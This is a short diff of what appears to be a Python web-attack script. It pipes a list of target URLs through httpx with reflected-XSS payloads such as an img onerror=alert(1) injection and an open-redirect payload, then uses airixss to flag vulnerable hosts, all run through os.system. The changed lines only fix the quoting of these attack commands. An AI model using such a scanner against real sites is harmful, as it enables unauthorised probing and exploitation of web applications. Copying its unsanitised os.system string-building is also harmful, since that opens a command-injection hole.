@@ -21,10 +21,10 @@ payload_xss_4 = "?page=%27%22><img src=x onerror=alert(1)>&view=%27%22><img src=
 
 execucao_op_1 = "cat "+args.lista+"|httpx -path '/"+payload_op_1+"'-silent -fr -title|grep 'Example Domain'"
 
-execucao_xss_1 = "cat '"+urls+"|httpx -path '/"+payload_xss_1+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
-execucao_xss_2 = "cat '"+urls+"|httpx -path '/"+payload_xss_2+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
-execucao_xss_3 = "cat '"+urls+"|httpx -path '/"+payload_xss_3+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
-execucao_xss_4 = "cat '"+urls+"|httpx -path '/"+payload_xss_4+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
+execucao_xss_1 = "cat "+urls+"|httpx -path '/"+payload_xss_1+"' -mc 200 |airixss -payload '=alert(1)>'"
+execucao_xss_2 = "cat "+urls+"|httpx -path '/"+payload_xss_2+"' -mc 200 |airixss -payload '=alert(1)>'"
+execucao_xss_3 = "cat "+urls+"|httpx -path '/"+payload_xss_3+"' -mc 200 |airixss -payload '=alert(1)>'"
+execucao_xss_4 = "cat "+urls+"|httpx -path '/"+payload_xss_4+"' -mc 200 |airixss -payload '=alert(1)>'"
 
 os.system(execucao_xss_1)
 os.system(execucao_xss_2)
